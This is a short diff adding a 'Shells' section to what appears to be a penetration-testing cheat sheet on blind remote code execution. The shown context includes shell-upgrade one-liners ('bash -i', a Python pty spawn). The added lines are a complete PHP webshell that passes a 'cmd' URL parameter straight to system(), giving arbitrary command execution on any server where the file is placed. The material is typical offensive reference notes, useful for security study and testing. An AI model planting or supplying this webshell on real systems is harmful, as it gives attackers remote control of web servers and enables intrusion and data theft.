@@ -201,3 +201,20 @@ Blind Remote Code Execution
   > chmod +x [...]
   > bash -i             // interactive shell
   > python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+Shells:
+------------------
+https://rosettacode.org/wiki/Execude_a_system_command
+> webshell
+  > php
+    > <html>
+      <?php
+      
+      echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></form>";
+      system($_GET["cmd"]);
+      
+      ?>
+      </html>
+      
+
